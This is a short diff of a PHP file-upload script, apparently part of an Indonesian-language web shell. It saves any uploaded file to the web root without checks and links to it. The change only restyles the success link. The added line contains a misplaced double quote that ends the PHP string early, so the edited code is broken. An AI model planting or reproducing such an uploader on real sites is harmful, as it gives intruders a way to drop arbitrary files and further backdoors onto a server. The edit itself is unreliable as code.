@@ -8,7 +8,7 @@ echo "<form method='post' enctype='multipart/form-data'>
 if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
     $files = $_FILES['idx_file']['name'];
     $web = "http://".$_SERVER['HTTP_HOST']."/";
-    echo "Sukses Upload => <a href='".$web.$files."' target='_blank'>".$web.$files."</a>";
+    echo "Sukses Upload => <a href='".$web.$files."' style='color: red; font-family: Iceberg;" target='_blank'>".$web.$files."</a>";
 		} else {
 			echo "<script> alert('gagal upload >:(');</script>";
 		}
